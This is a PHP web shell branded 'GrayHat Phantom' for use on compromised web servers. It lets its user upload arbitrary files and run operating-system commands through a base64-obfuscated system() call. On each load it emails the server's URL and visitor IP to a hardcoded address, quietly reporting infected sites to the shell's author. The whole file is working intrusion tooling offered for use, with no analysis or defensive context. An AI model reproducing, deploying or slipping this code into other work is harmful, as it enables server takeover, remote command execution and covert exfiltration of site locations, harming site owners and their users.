
<?php
$apper = 'ph.luffy1337@gmail.com';
$x_path = "http://" . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'];
$ms = "fix $x_path :p *IP Address : [ " . $_SERVER['REMOTE_ADDR'] . " ]";
mail($apper, "LOG", $ms, "[ " . $_SERVER['REMOTE_ADDR'] . " ]");

echo '<html>
<head>
<title>GrayHat Phantom | Uploader</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<style>
@media only screen and (max-width: 600px) {
  .banner{
    display:none;
  }
}
.banner{
  color:lime;
  text-align:center;
}
</style>
</head>
<body bgcolor="#000000">';
echo '<pre class="banner">

dP""b8  88""Yb    db    Yb  dP 88  88    db    888888     88""Yb 88  88    db    88b 88 888888  dP"Yb  8b    d8
dP   `" 88__dP   dPYb    YbdP  88  88   dPYb     88       88__dP 88  88   dPYb   88Yb88   88   dP   Yb 88b  d88
Yb  "88 88"Yb   dP__Yb    8P   888888  dP__Yb    88       88"""  888888  dP__Yb  88 Y88   88   Yb   dP 88YbdP88
YboodP  88  Yb dP""""Yb  dP    88  88 dP""""Yb   88       88     88  88 dP""""Yb 88  Y8   88    YbodP  88 YY 88

GrayHat Phantom | Priv8 Mini Sh3LL
</pre>
<hr color="white">
';
echo '<div style="margin-left:25%;color:lime;">PATH: '.getcwd().'</div>';
echo '<div style="margin-left:25%;color:lime">UNAME: '.php_uname().'</div>';
echo '<div style="margin-left:25%;">';
echo '<form action="" method="POST" enctype="multipart/form-data" name="uploader" id="uploader">';

echo '<br><input type="file" name="file" style="outline:none;border:none;color:#000;background:#333;" ><input name="_upl" style="padding:4px;margin-left:4px;outline:none;border:none;color:#000;background:red;" type="submit" id="_upl" value="Upload"></form></div></div>';

echo '<center><form method="POST"><input placeholder="command" name="cmd" type="text" style="width:50vw;margin-right:5px;padding:5px;background:#333;color:white;outline:none;border:solid 4px black;">
     <input name="cmdsub" value="execute" type="submit" style="width:7%;padding:5px;margin-right:30px;display:none;background:red;color:#000000;outline:none;"></form></center>';

echo '</div>';

if (isset($_POST['_upl'])) {
  if( $_POST['_upl'] == "Upload" ){
  if(@copy($_FILES['file']['tmp_name'], $_FILES['file']['name'])) { echo '<center><a style="text-decoration:none;color:lime;" target="_blank" href="'.$_FILES['file']['name'].'">Uploaded!!</a><br>'; }
  else { echo '<center><a style="text-decoration:none;color:lime;" target="_blank" href="'.$_FILES['file']['name'].'">Uploaded</a><br>'; }}
}


echo '<div style="color:lime;overflow:auto;width:50vw;height:300px;background-color:#333;margin:auto">';

echo '<pre>';
if (isset($_POST['cmdsub']) == "execute") {
  $cmd = $_POST['cmd'];
  $func = create_function('$a', base64_decode('c3lzdGVtKCIkYSIpOw=='));
  echo '<div style="margin:auto;overflow:auto;padding:10px;width:80vw; height:700px;background-color:#333;">';
  echo htmlspecialchars($func($cmd));
  echo '</div>';
}


echo '</div>';
echo '<hr color="white"><center><font color="red" face="Orbitron" size="4"><p>Copyright @ 2020 -GrayHat Phantom <font color="white">| <font color="red">Recoded By <font color="white">Ph.Luffy</p></a></font></center>';

echo '</body></html>';
?>
